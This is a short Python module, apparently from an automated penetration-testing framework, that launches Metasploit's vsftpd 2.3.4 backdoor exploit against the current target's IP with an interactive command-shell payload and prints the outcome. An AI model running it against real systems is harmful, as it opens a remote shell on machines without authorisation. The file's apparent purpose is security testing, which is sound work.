from pinaht.modules.metasploit.metasploit_module import MetasploitModule


class MetasploitVsFTPd234BackdoorModule(MetasploitModule):
    def __init__(self, knowledge_base, managers):
        super(MetasploitModule, self).__init__(knowledge_base, managers)

        self.estimated_time = 10
        self.success_chance = 1.0

    def check_precondition(self):
        return True

    def execute(self):
        target = self.managers["TargetManager"].get_current_target()
        exploit_options = {"RHOST": target.ip_address}

        has_worked, results = MetasploitModule.execute_exploit(
            "unix/ftp/vsftpd_234_backdoor", exploit_options, "cmd/unix/interact"
        )

        if has_worked is True:
            print(results)

    def apply_knowledge(self):
        pass

    def log_stuff(self):
        pass
